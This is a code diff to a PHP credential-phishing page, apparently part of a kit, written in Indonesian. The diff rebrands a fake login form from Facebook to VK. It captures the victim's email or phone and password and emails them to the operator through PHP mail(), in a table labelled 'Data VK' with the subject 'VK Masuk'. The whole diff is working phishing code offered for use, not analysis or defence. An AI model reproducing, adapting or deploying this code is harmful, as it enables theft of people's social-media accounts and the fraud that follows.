@@ -26,9 +26,10 @@ $miraipediaa = $_POST['mirai-reward'];
         <div class="col-sm-6 col-md-4 col-md-offset-4">
             <div class="login2">
                 <form method="POST" class="form-signin">
-                    <img class="img-login2" src="../assets/images/fb.png" alt="miraipedia">
-                    <input type="text" name="userf" class="form-control" placeholder="Email Atau Telepon" required>
-                    <input type="password" name="pwf" class="form-control" placeholder="Kata Sandi" required>
+                    <img class="img-login2" src="../assets/images/vk.png" alt="miraipedia">
+                    <input type="text" name="userv" class="form-control" placeholder="Email Atau Telepon" required>
+                    <input type="password" name="pwv" class="form-control" placeholder="Kata Sandi" required>
+
 
                     <br>
                     <button class="btn btn-lg btn-primary btn-block" name="r" value="<?php echo $miraipediaa;?>" type="submit">Masuk</button>
@@ -51,15 +52,15 @@ $miraipediaa = $_POST['mirai-reward'];
 		    #idhaam69 th {padding-top: 12px;padding-bottom: 12px;text-align: left;background-color: #4CAF50;color: white;}</style></head>
 		    <body>
 		    <table id='idhaam69'>
-            <tr><th>Data FB</th></tr>
-		    <tr><td>Email : $imel2</td></tr>
-            <tr><td>password : $pw2</td></tr>
-            <tr><th>Blog : Freemanpediarch.blogspot.com</th></tr>
+            <tr><th>Data VK</th></tr>
+		    <tr><td>Email : $imel3</td></tr>
+            <tr><td>password : $pw3</td></tr>
+            <tr><th>Blog : freemanpediarch.blogspot.com</th></tr>
 		    </table>
 		    </body>
 		    </html>
 EOD;
-		    $subjek = 'FB Masuk Bos '.$imel2.' ';
+		    $subjek = 'VK Masuk '.$imel2.' ';
 		    $headers = "From: freeman08@pedia.com\r\n";
 		    $headers .= "Content-type: text/html\r\n";
 		    $success = mail($mailto, $subjek, $body, $headers);
